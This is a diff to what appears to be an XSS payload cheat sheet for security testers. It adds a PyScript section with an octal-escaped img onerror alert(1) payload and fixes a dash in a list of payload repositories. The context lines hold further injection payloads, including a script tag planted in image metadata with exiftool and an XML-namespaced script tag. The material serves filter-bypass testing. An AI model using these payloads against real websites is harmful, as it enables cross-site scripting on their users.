@@ -107,7 +107,7 @@
 - [ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
 - [masatokinugawa/filterbypass](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
 - [bugbounty-cheatsheet/cheatsheets/xss.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
-- [aurebesh.js – Translate JavaScript to Other Writing Systems](https://aem1k.com/aurebesh.js/)
+- [aurebesh.js - Translate JavaScript to Other Writing Systems](https://aem1k.com/aurebesh.js/)
 - [cujanovic/Markdown-XSS-Payloads](https://github.com/cujanovic/Markdown-XSS-Payloads) - XSS payloads for exploiting Markdown syntax
 
 **Tips**
@@ -315,6 +315,17 @@ exiftool -Artist='"><script>alert(1)</script>' test.jpeg
 **xml**
 ```xml
 <a:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</a:script>
+```
+
+#### pyscript
+
+- https://github.com/pyscript/pyscript
+
+```script
+<link rel="stylesheet" href="https://pyscript.net/alpha/pyscript.css" />
+<script defer src="https://pyscript.net/alpha/pyscript.js"></script>
+
+<py-script>'\74img/src/onerror\75alert(1)\76'</py-script>
 ```
 
 ---
